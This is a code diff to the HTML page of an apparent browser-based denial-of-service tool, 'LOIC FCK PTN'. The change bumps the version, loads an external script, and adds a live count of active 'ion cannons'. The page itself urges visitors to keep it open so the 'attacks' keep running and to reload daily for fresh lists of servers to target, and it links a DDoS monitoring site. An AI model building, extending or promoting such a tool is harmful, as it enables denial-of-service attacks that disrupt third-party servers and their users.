@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>LOIC FCK PTN v1.5</title>
+  <title>LOIC FCK PTN v1.6</title>
   <meta charset="utf-8"/>
+  <script src="online.js"></script>
   <script>
     "use strict";
 
@@ -200,7 +201,7 @@
 <body>
 <div>
   <div class="heading">
-    <h1>LOIC FCK PTN v1.5</h1>
+    <h1>LOIC FCK PTN v1.6</h1>
     <p class="heading-blue">Keep this page open to keep the "attacks" running</p>
     <p class="heading-blue">Reload once per day to get updated lists of servers to target!</p>
   </div>
@@ -233,6 +234,8 @@
 
   <h2>Is it working?</h2>
   <p>See for yourself ;) <a href="https://ddosmonitor.herokuapp.com" target="monitor">Here is our monitoring site</a>.</p>
+  <p>In the last hour we had
+    <b><script>try {document.write("" + ioncannons);} catch(err) {document.write("???");}</script> ion cannons active!</b></p>
   <h2>My machine is to weak / strong for this script?</h2>
   <form action="index.html" method="GET">
     <select id="rqps" name="rqps">
